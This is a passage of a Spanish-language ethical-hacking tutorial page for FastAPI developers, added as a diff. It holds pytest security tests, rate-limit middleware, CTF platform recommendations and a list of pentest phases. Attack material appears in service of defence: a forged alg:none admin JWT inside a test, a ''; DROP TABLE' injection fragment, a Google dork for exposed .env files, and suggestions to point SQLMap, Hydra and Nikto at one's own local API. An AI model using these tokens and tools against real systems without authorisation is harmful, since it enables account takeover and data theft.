+<span class="cm"># tests/security/test_auth.py</span>
+<span class="kw">import</span> pytest
+<span class="kw">from</span> httpx <span class="kw">import</span> AsyncClient
+<span class="kw">from</span> jose <span class="kw">import</span> jwt
+
+<span class="dec">@pytest.mark.asyncio</span>
+<span class="kw">async def</span> <span class="fn">test_login_brute_force_protection</span>(client: AsyncClient):
+    <span class="cm">"""Después de N intentos fallidos, debe bloquear."""</span>
+    <span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(<span class="num">10</span>):
+        response = <span class="kw">await</span> client.<span class="fn">post</span>(<span class="str">"/api/v1/auth/login"</span>,
+            data={<span class="str">"username"</span>: <span class="str">"admin@test.com"</span>, <span class="str">"password"</span>: <span class="str">"wrong"</span>})
+    <span class="cm"># El 11vo intento debe ser bloqueado</span>
+    response = <span class="kw">await</span> client.<span class="fn">post</span>(<span class="str">"/api/v1/auth/login"</span>,
+        data={<span class="str">"username"</span>: <span class="str">"admin@test.com"</span>, <span class="str">"password"</span>: <span class="str">"wrong"</span>})
+    <span class="kw">assert</span> response.status_code == <span class="num">429</span>  <span class="cm"># Too Many Requests</span>
+
+<span class="dec">@pytest.mark.asyncio</span>
+<span class="kw">async def</span> <span class="fn">test_jwt_algorithm_none_rejected</span>(client: AsyncClient):
+    <span class="cm">"""El servidor no debe aceptar JWT con alg:none."""</span>
+    malicious_token = jwt.<span class="fn">encode</span>(
+        {<span class="str">"sub"</span>: <span class="str">"1"</span>, <span class="str">"role"</span>: <span class="str">"admin"</span>},
+        <span class="str">""</span>,
+        algorithm=<span class="str">"none"</span>  <span class="cm"># ← ataque</span>
+    )
+    response = <span class="kw">await</span> client.<span class="fn">get</span>(
+        <span class="str">"/api/v1/users"</span>,
+        headers={<span class="str">"Authorization"</span>: <span class="fn">f</span><span class="str">"Bearer {malicious_token}"</span>}
+    )
+    <span class="kw">assert</span> response.status_code == <span class="num">401</span>  <span class="cm"># debe rechazar</span>
+
+<span class="dec">@pytest.mark.asyncio</span>
+<span class="kw">async def</span> <span class="fn">test_expired_token_rejected</span>(client: AsyncClient):
+    <span class="cm">"""Token expirado no debe funcionar."""</span>
+    <span class="kw">from</span> datetime <span class="kw">import</span> datetime, timedelta
+    expired_token = jwt.<span class="fn">encode</span>(
+        {<span class="str">"sub"</span>: <span class="str">"1"</span>, <span class="str">"exp"</span>: datetime.utcnow() - <span class="fn">timedelta</span>(hours=<span class="num">1</span>)},
+        settings.SECRET_KEY, algorithm=<span class="str">"HS256"</span>
+    )
+    response = <span class="kw">await</span> client.<span class="fn">get</span>(<span class="str">"/api/v1/users"</span>,
+        headers={<span class="str">"Authorization"</span>: <span class="fn">f</span><span class="str">"Bearer {expired_token}"</span>})
+    <span class="kw">assert</span> response.status_code == <span class="num">401</span>
+      </div>
+    </div>
+
+    <div class="code-pane" id="ctab-idor">
+      <div class="code-block">
+<span class="cm"># tests/security/test_idor.py</span>
+<span class="kw">import</span> pytest
+<span class="kw">from</span> httpx <span class="kw">import</span> AsyncClient
+
+<span class="dec">@pytest.mark.asyncio</span>
+<span class="kw">async def</span> <span class="fn">test_idor_user_cannot_access_other_user</span>(client, user_a_token, user_b_id):
+    <span class="cm">"""Usuario A no puede ver datos del usuario B."""</span>
+    response = <span class="kw">await</span> client.<span class="fn">get</span>(
+        <span class="fn">f</span><span class="str">"/api/v1/users/{user_b_id}"</span>,
+        headers={<span class="str">"Authorization"</span>: <span class="fn">f</span><span class="str">"Bearer {user_a_token}"</span>}
+    )
+    <span class="kw">assert</span> response.status_code == <span class="num">403</span>  <span class="cm"># Forbidden</span>
+
+<span class="dec">@pytest.mark.asyncio</span>
+<span class="kw">async def</span> <span class="fn">test_idor_user_can_access_own_profile</span>(client, user_a_token, user_a_id):
+    <span class="cm">"""Usuario A SÍ puede ver su propio perfil."""</span>
+    response = <span class="kw">await</span> client.<span class="fn">get</span>(
+        <span class="fn">f</span><span class="str">"/api/v1/users/{user_a_id}"</span>,
+        headers={<span class="str">"Authorization"</span>: <span class="fn">f</span><span class="str">"Bearer {user_a_token}"</span>}
+    )
+    <span class="kw">assert</span> response.status_code == <span class="num">200</span>
+
+<span class="dec">@pytest.mark.asyncio</span>
+<span class="kw">async def</span> <span class="fn">test_idor_sequential_id_enumeration</span>(client, attacker_token):
+    <span class="cm">"""Enumerar IDs secuenciales no debe revelar otros usuarios."""</span>
+    success_count = <span class="num">0</span>
+    <span class="kw">for</span> user_id <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">50</span>):
+        r = <span class="kw">await</span> client.<span class="fn">get</span>(<span class="fn">f</span><span class="str">"/api/v1/users/{user_id}"</span>,
+            headers={<span class="str">"Authorization"</span>: <span class="fn">f</span><span class="str">"Bearer {attacker_token}"</span>})
+        <span class="kw">if</span> r.status_code == <span class="num">200</span>:
+            success_count += <span class="num">1</span>
+    <span class="kw">assert</span> success_count == <span class="num">1</span>  <span class="cm"># Solo su propio perfil</span>
+
+<span class="cm"># Correr: pytest tests/security/ -v --tb=short</span>
+      </div>
+    </div>
+
+    <div class="code-pane" id="ctab-ratelimit">
+      <div class="code-block">
+<span class="cm"># app/middleware/rate_limit.py</span>
+<span class="cm"># pip install slowapi</span>
+<span class="kw">from</span> slowapi <span class="kw">import</span> Limiter, _rate_limit_exceeded_handler
+<span class="kw">from</span> slowapi.util <span class="kw">import</span> get_remote_address
+<span class="kw">from</span> slowapi.errors <span class="kw">import</span> RateLimitExceeded
+<span class="kw">from</span> fastapi <span class="kw">import</span> FastAPI, Request
+
+limiter = <span class="fn">Limiter</span>(key_func=get_remote_address)
+app = <span class="fn">FastAPI</span>()
+app.state.limiter = limiter
+app.<span class="fn">add_exception_handler</span>(RateLimitExceeded, _rate_limit_exceeded_handler)
+
+<span class="cm"># Proteger endpoints críticos</span>
+<span class="dec">@app.post</span>(<span class="str">"/api/v1/auth/login"</span>)
+<span class="dec">@limiter.limit</span>(<span class="str">"5/minute"</span>)  <span class="cm"># máx 5 intentos por minuto por IP</span>
+<span class="kw">async def</span> <span class="fn">login</span>(request: Request, credentials: OAuth2PasswordRequestForm):
+    <span class="kw">return await</span> auth_service.<span class="fn">login</span>(credentials)
+
+<span class="dec">@app.post</span>(<span class="str">"/api/v1/auth/register"</span>)
+<span class="dec">@limiter.limit</span>(<span class="str">"3/hour"</span>)  <span class="cm"># anti-spam registration</span>
+<span class="kw">async def</span> <span class="fn">register</span>(request: Request, user: UserCreate):
+    <span class="kw">return await</span> user_service.<span class="fn">create_user</span>(user)
+
+<span class="cm"># Test en pytest:</span>
+<span class="kw">async def</span> <span class="fn">test_rate_limit_login</span>(client):
+    <span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(<span class="num">5</span>):
+        <span class="kw">await</span> client.<span class="fn">post</span>(<span class="str">"/api/v1/auth/login"</span>, ...)
+    r = <span class="kw">await</span> client.<span class="fn">post</span>(<span class="str">"/api/v1/auth/login"</span>, ...)
+    <span class="kw">assert</span> r.status_code == <span class="num">429</span>  <span class="cm"># Too Many Requests ✓</span>
+      </div>
+    </div>
+
+    <div class="code-pane" id="ctab-headers">
+      <div class="code-block">
+<span class="cm"># tests/security/test_headers.py</span>
+<span class="cm"># Verificar que los headers de seguridad están presentes</span>
+<span class="kw">import</span> pytest
+
+REQUIRED_SECURITY_HEADERS = {
+    <span class="str">"X-Frame-Options"</span>: <span class="str">"DENY"</span>,
+    <span class="str">"X-Content-Type-Options"</span>: <span class="str">"nosniff"</span>,
+    <span class="str">"Strict-Transport-Security"</span>: <span class="kw">lambda</span> v: <span class="str">"max-age"</span> <span class="kw">in</span> v,
+    <span class="str">"Content-Security-Policy"</span>: <span class="kw">lambda</span> v: <span class="str">"default-src"</span> <span class="kw">in</span> v,
+    <span class="str">"X-Powered-By"</span>: <span class="str">""</span>,  <span class="cm"># debe estar vacío</span>
+}
+
+<span class="dec">@pytest.mark.asyncio</span>
+<span class="kw">async def</span> <span class="fn">test_security_headers_present</span>(client):
+    response = <span class="kw">await</span> client.<span class="fn">get</span>(<span class="str">"/"</span>)
+    <span class="kw">for</span> header, expected <span class="kw">in</span> REQUIRED_SECURITY_HEADERS.<span class="fn">items</span>():
+        actual = response.headers.<span class="fn">get</span>(header, <span class="str">""</span>)
+        <span class="kw">if callable</span>(expected):
+            <span class="kw">assert</span> <span class="fn">expected</span>(actual), <span class="fn">f</span><span class="str">"Header {header} inválido: {actual}"</span>
+        <span class="kw">else</span>:
+            <span class="kw">assert</span> actual == expected, <span class="fn">f</span><span class="str">"Header {header}: {actual} != {expected}"</span>
+
+<span class="dec">@pytest.mark.asyncio</span>
+<span class="kw">async def</span> <span class="fn">test_server_header_hidden</span>(client):
+    <span class="cm">"""El servidor no debe revelar tecnología en el header Server."""</span>
+    response = <span class="kw">await</span> client.<span class="fn">get</span>(<span class="str">"/"</span>)
+    server = response.headers.<span class="fn">get</span>(<span class="str">"server"</span>, <span class="str">""</span>).<span class="fn">lower</span>()
+    <span class="kw">assert</span> <span class="str">"uvicorn"</span> <span class="kw">not in</span> server  <span class="cm"># no revelar stack</span>
+    <span class="kw">assert</span> <span class="str">"python"</span> <span class="kw">not in</span> server
+
+<span class="cm"># Ejecutar todo:</span>
+<span class="cm"># pytest tests/security/ -v --cov=app --cov-report=html</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════ CTF CULTURE ════ -->
+<section class="ctf-section" id="ctf">
+  <div class="section-inner">
+    <p class="sec-label fade-in">// sección 07 — practica real</p>
+    <h2 class="sec-h2 fade-in">CTF — <em>Capture The Flag</em><br>Aprende hackeando legalmente</h2>
+    <p class="sec-sub fade-in">Plataformas con máquinas vulnerables a propósito. La forma más efectiva de aprender ethical hacking sin riesgo legal.</p>
+
+    <div class="ctf-cards">
+      <div class="ctf-card fade-in">
+        <div class="ctf-category">Para empezar</div>
+        <h3>HACK THE BOX</h3>
+        <p>La plataforma más prestigiosa. Máquinas reales, vulnerabilidades reales. El ranking HTB es reconocido en contratos de pentesting.</p>
+        <div class="ctf-platforms">
+          <span class="ctf-pill beginner">Starting Point</span>
+          <span class="ctf-pill mid">Máquinas Medium</span>
+          <span class="ctf-pill hard">Pro Labs</span>
+        </div>
+      </div>
+      <div class="ctf-card fade-in">
+        <div class="ctf-category">Más amigable</div>
+        <h3>TRY HACK ME</h3>
+        <p>Ideal para principiantes. Rutas de aprendizaje guiadas, desde conceptos básicos hasta técnicas avanzadas. Browser-based, sin instalar nada.</p>
+        <div class="ctf-platforms">
+          <span class="ctf-pill beginner">Pre-Security</span>
+          <span class="ctf-pill beginner">Jr Pentester</span>
+          <span class="ctf-pill mid">Red Team</span>
+        </div>
+      </div>
+      <div class="ctf-card fade-in">
+        <div class="ctf-category">Web App Focus</div>
+        <h3>PORTSWIGGER LABS</h3>
+        <p>De los creadores de Burp Suite. Los mejores labs de Web Application Security del mundo. Gratis. Cubre exactamente las vulnerabilidades de tu FastAPI.</p>
+        <div class="ctf-platforms">
+          <span class="ctf-pill beginner">SQL Injection</span>
+          <span class="ctf-pill mid">Auth Bypass</span>
+          <span class="ctf-pill hard">XXE · SSRF</span>
+        </div>
+      </div>
+      <div class="ctf-card fade-in">
+        <div class="ctf-category">Competencia</div>
+        <h3>PICOCTF</h3>
+        <p>Organizado por Carnegie Mellon. Problemas de criptografía, forense, reversing, web. Perfecto para construir pensamiento CTF desde cero.</p>
+        <div class="ctf-platforms">
+          <span class="ctf-pill beginner">Año 1</span>
+          <span class="ctf-pill mid">Año 2</span>
+          <span class="ctf-pill beginner">Gratuito</span>
+        </div>
+      </div>
+      <div class="ctf-card fade-in">
+        <div class="ctf-category">API Security</div>
+        <h3>CRAPI / DVWA</h3>
+        <p>APIs deliberadamente vulnerables. crAPI (completely ridiculous API) = API con todas las vulnerabilidades del OWASP API Top 10. Córrela localmente.</p>
+        <div class="ctf-platforms">
+          <span class="ctf-pill beginner">Docker local</span>
+          <span class="ctf-pill mid">OWASP API</span>
+          <span class="ctf-pill beginner">Gratis</span>
+        </div>
+      </div>
+      <div class="ctf-card fade-in">
+        <div class="ctf-category">Certficaciones</div>
+        <h3>CEH · OSCP · eJPT</h3>
+        <p>eJPT (gratis) → CEH → OSCP. El OSCP es el examen de 24 horas continuas de pentesting más respetado del mundo. Meta a largo plazo.</p>
+        <div class="ctf-platforms">
+          <span class="ctf-pill beginner">eJPT → gratis</span>
+          <span class="ctf-pill mid">CEH</span>
+          <span class="ctf-pill hard">OSCP</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════ MINDSET ════ -->
+<section class="mindset-section" id="mindset">
+  <div class="section-inner">
+    <p class="sec-label fade-in">// sección 08 — mentalidad</p>
+    <h2 class="sec-h2 fade-in">El <em>mindset</em><br>del hacker ético</h2>
+
+    <div class="mindset-quote fade-in">
+      <blockquote>
+        "Un hacker ético piensa en todos los casos extremos que un desarrollador normal ignoraría. No es paranoia — es rigor."
+      </blockquote>
+      <cite>— Principio del Red Team</cite>
+    </div>
+
+    <div class="mindset-grid">
+      <div class="mindset-card fade-in">
+        <div class="mindset-num">01</div>
+        <h3>Piensa como el atacante</h3>
+        <p>Cada endpoint que creas, pregúntate: ¿qué pasa si el input es <code style="color:var(--red)">'; DROP TABLE</code>? ¿si el user_id es negativo? ¿si el archivo tiene extensión falsa? El pensamiento adversarial es una habilidad que se entrena.</p>
+      </div>
+      <div class="mindset-card fade-in">
+        <div class="mindset-num">02</div>
+        <h3>Nunca asumas confianza</h3>
+        <p>Todo input del exterior es potencialmente malicioso — URL params, headers, body JSON, archivos. Pydantic valida estructura pero no intención. Valida el negocio también, no solo el tipo.</p>
+      </div>
+      <div class="mindset-card fade-in">
+        <div class="mindset-num">03</div>
+        <h3>Defensa en profundidad</h3>
+        <p>Ninguna capa de seguridad es perfecta sola. TLS puede fallar, el WAF puede eludirse, el JWT puede comprometerse. El objetivo es que el atacante tenga que romper 5 capas, no 1.</p>
+      </div>
+      <div class="mindset-card fade-in">
+        <div class="mindset-num">04</div>
+        <h3>Privilege of least access</h3>
+        <p>Tu API no necesita permisos de superusuario en PostgreSQL. El proceso de FastAPI no necesita acceso root en el servidor. Cada componente debe tener exactamente los permisos que necesita — ni uno más.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════ LOG ════ -->
+<section class="log-section">
+  <div class="log-entry">
+    <div class="log-date">ENTRADA #004 — CAPÍTULO 04 COMPLETADO</div>
+    <p>
+      Hoy entendí que el hacking ético no es técnica — es perspectiva. La misma FastAPI que construí para servir usuarios, vista desde el lado de un atacante, es una superficie de ataque con 10 vectores diferentes. IDOR me pareció el más revelador: una línea de código faltante (<code style="color:var(--green)">if current_user.id != user_id</code>) y todos los datos de todos los usuarios están expuestos.
+    </p>
+    <p>
+      El siguiente paso concreto: instalar Kali Linux en WSL2, correr crAPI en Docker localmente, y completar el path "Jr Penetration Tester" en TryHackMe. Los security tests con pytest van al CI/CD desde hoy — cada push valida que la API no tiene IDOR, que rate limiting funciona, y que los headers de seguridad están presentes.
+    </p>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-brand">CIPHER</div>
+  <div class="chapter-nav">
+    <a href="cybersec_chapter3.html" class="ch-link prev">
+      <span class="ch-label">← Anterior</span>
+      <span class="ch-title">03 — Criptografía</span>
+    </a>
+    <a href="#" class="ch-link">
+      <span class="ch-label">Próximo →</span>
+      <span class="ch-title">05 — AppSec & OWASP en tu código</span>
+    </a>
+  </div>
+</footer>
+<div class="footer-copy">CIPHER DOC — Capítulo 04: Ethical Hacking · OWASP · Kali · pytest Security · Construido con Claude Pro</div>
+
+<script>
+// ── Hero canvas: binary rain + attack nodes
+const canvas = document.getElementById('hero-canvas');
+const ctx = canvas.getContext('2d');
+function resize(){ canvas.width = innerWidth; canvas.height = innerHeight; }
+resize(); addEventListener('resize', resize);
+
+const cols = Math.floor(innerWidth / 20);
+const drops = Array(cols).fill(0).map(() => Math.random() * -50);
+const chars = '01アイウエオカキクケコ∂∑∏∫ABCDEF!@#$%^&*<>';
+
+function drawRain(){
+  ctx.fillStyle = 'rgba(5,5,7,0.06)';
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+  ctx.font = '13px Share Tech Mono';
+  for(let i = 0; i < drops.length; i++){
+    const ch = chars[Math.floor(Math.random() * chars.length)];
+    const alpha = Math.random() * 0.25;
+    ctx.fillStyle = `rgba(255,63,63,${alpha})`;
+    ctx.fillText(ch, i * 20, drops[i] * 20);
+    if(drops[i] * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+    drops[i] += 0.5;
+  }
+  requestAnimationFrame(drawRain);
+}
+drawRain();
+
+// ── Phase data
+const phases = [
+  {
+    text: `<p>Recopilar la mayor información posible sobre el objetivo <em>sin interactuar directamente</em> con él. Aquí el atacante permanece invisible.</p>
+<p>Fuentes: WHOIS, DNS records, LinkedIn (empleados), GitHub (código filtrado), Shodan (dispositivos expuestos), Google Dorks (<code style="color:var(--red)">site:tudominio.com filetype:env</code>).</p>
+<p>El objetivo: entender la superficie de ataque antes de tocarla.</p>`,
+    tools: [
+      ['🔍','theHarvester','Emails, IPs, subdominios','Pasivo'],
+      ['🌐','Shodan','Dispositivos y puertos expuestos','Pasivo'],
+      ['📋','Maltego','Grafo de relaciones del objetivo','Pasivo'],
+      ['🔎','OSINT Framework','Fuentes de inteligencia abiertas','Pasivo'],
+      ['📁','Google Dorks','Archivos sensibles indexados','Pasivo'],
+    ],
+    fastapi: '→ En tu stack: buscar en GitHub si hay commits con .env, SECRET_KEY, DATABASE_URL. Usar gitguardian.com para detectar secrets filtrados.'
+  },
+  {
+    text: `<p>Interacción activa con el objetivo para mapear la red, puertos, servicios y versiones exactas. Aquí ya se generan logs en el servidor objetivo.</p>
+<p>Herramientas activas: nmap para puertos, Nikto para vulnerabilidades web básicas, ffuf/gobuster para directorios y endpoints.</p>`,
+    tools: [
+      ['🗺','Nmap','Puertos, servicios, OS fingerprinting','Activo'],
+      ['🔩','Nikto','Vulnerabilidades web básicas','Activo'],
+      ['💨','ffuf','Fuzzing de endpoints y directorios','Activo'],
+      ['🕷','Burp Scanner','Crawl de la aplicación web','Activo'],
+      ['📊','Nessus','Escaneo de vulnerabilidades completo','Activo'],
+    ],
+    fastapi: '→ En tu stack: nmap -sV localhost para ver qué expones. Nikto -h http://localhost:8000 para checar configuraciones inseguras básicas.'
+  },
+  {
+    text: `<p>Usando la información recopilada, intentar ganar acceso al sistema. No se destruye nada — el objetivo es demostrar que el acceso es posible.</p>
+<p>Técnicas: explotación de vulnerabilidades conocidas (CVEs), inyección, auth bypass, social engineering. Documentar cada paso con screenshots.</p>`,
+    tools: [
+      ['💉','SQLMap','SQL injection automatizado','Explotación'],
+      ['⚡','Metasploit','Framework de explotación CVEs','Explotación'],
+      ['🔐','Hydra','Brute force de autenticación','Explotación'],
+      ['🕸','Burp Repeater','Manipulación manual de requests','Explotación'],
+      ['🧪','custom scripts','Python scripts para vulnerabilidades específicas','Explotación'],
+    ],
+    fastapi: '→ En tu stack: probar SQLMap en tus endpoints de búsqueda, Hydra contra el login, Burp para manipular JWTs y verificar IDOR en IDs secuenciales.'
+  },
+  {
+    text: `<p>Una vez dentro, un atacante real intentaría: escalada de privilegios, movimiento lateral, persistencia (backdoors), exfiltración de datos. El Red Teamer documenta todo sin hacer daño real.</p>
+<p>En el contexto de API pentesting: ¿puede un usuario normal llegar a ser admin? ¿Puede acceder a datos de producción desde el entorno de dev?</p>`,
+    tools: [
+      ['⬆','Privilege Escalation','sudo, SUID bits, PATH hijacking','Post-exploit'],
+      ['↔','Lateral Movement','Desde un servicio a otro en la red','Post-exploit'],
+      ['📦','Data Exfiltration','Extraer datos sensibles silenciosamente','Post-exploit'],
+      ['🔒','Persistence','Backdoors, cron jobs maliciosos','Post-exploit'],
+      ['🧹','Covering Tracks','Limpiar logs, timestamps','Post-exploit'],
+    ],
+    fastapi: '→ En tu stack: desde un usuario comprometido, ¿puede escalar a admin? Verificar que los endpoints /admin requieren is_admin explícitamente, no solo autenticación.'
+  },
+  {
+    text: `<p>El trabajo no termina al explotar — termina al documentar. Un reporte de pentest profesional incluye: resumen ejecutivo, hallazgos con CVSS score, evidencia (screenshots, requests), y remediación concreta.</p>
+<p>Sin reporte, el pentest no existió. El valor está en la comunicación, no solo en encontrar la vulnerabilidad.</p>`,
+    tools: [
+      ['📝','Dradis','Plataforma colaborativa de reportes','Reporte'],
+      ['📊','CVSS Calculator','Score de severidad estándar','Reporte'],
+      ['📸','Flameshot','Screenshots anotados','Reporte'],
+      ['📋','Notion/Obsidian','Notas durante el pentest','Reporte'],
+      ['📄','LaTeX / Word','Reporte final profesional','Reporte'],
+    ],
+    fastapi: '→ En tu stack: después de tus security tests con pytest, generar un reporte HTML automático con pytest-html. Integrar en GitHub Actions para cada PR.'
+  }
+];
+
+function renderPhase(idx){
+  const p = phases[idx];
+  const det = document.getElementById('phase-detail');
+  det.classList.add('active');
+  det.innerHTML = `
+    <div class="phase-detail-text">${p.text}</div>
+    <div class="phase-tools">
+      ${p.tools.map(([icon,name,desc,tag]) => `
+        <div class="tool-item">
+          <span class="tool-icon">${icon}</span>
+          <span class="tool-name">${name}</span>
+          <span style="color:rgba(232,230,223,0.4);font-size:0.65rem">${desc}</span>
+          <span class="tool-desc">${tag}</span>
+        </div>`).join('')}
+    </div>
+    <div class="phase-fastapi">${p.fastapi}</div>
+  `;
+}
+
+document.querySelectorAll('.phase-card').forEach((card, i) => {
+  card.addEventListener('click', () => {
+    document.querySelectorAll('.phase-card').forEach(c => c.classList.remove('active'));
+    card.classList.add('active');
+    renderPhase(i);
+  });
+});
+renderPhase(0);
+
+// ── OWASP accordion
+document.querySelectorAll('.owasp-row').forEach((row, i) => {
+  row.addEventListener('click', () => {
+    const det = document.getElementById(`detail-${i}`);
+    if(!det) return;
+    const isOpen = det.classList.contains('open');
+    document.querySelectorAll('.owasp-detail').forEach(d => d.classList.remove('open'));
+    if(!isOpen) det.classList.add('open');
+  });
+});
+
+// ── Terminal tabs
+document.querySelectorAll('.t-tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('.t-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.t-pane').forEach(p => p.classList.remove('active'));
+    tab.classList.add('active');
+    document.getElementById('ttab-' + tab.dataset.ttab).classList.add('active');
+  });
+});
+
+// ── Code tabs
+document.querySelectorAll('.code-tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.code-pane').forEach(p => p.classList.remove('active'));
+    tab.classList.add('active');
+    document.getElementById('ctab-' + tab.dataset.ctab).classList.add('active');
+  });
+});
+
+// ── Scroll animations
+const obs = new IntersectionObserver(entries => {
+  entries.forEach(e => { if(e.isIntersecting) e.target.classList.add('visible'); });
+}, { threshold: 0.07, rootMargin: '0px 0px -40px 0px' });
+document.querySelectorAll('.fade-in').forEach((el, i) => {
+  el.style.transitionDelay = `${(i % 5) * 0.07}s`;
+  obs.observe(el);
+});
+</script>
+</body>
+</html>
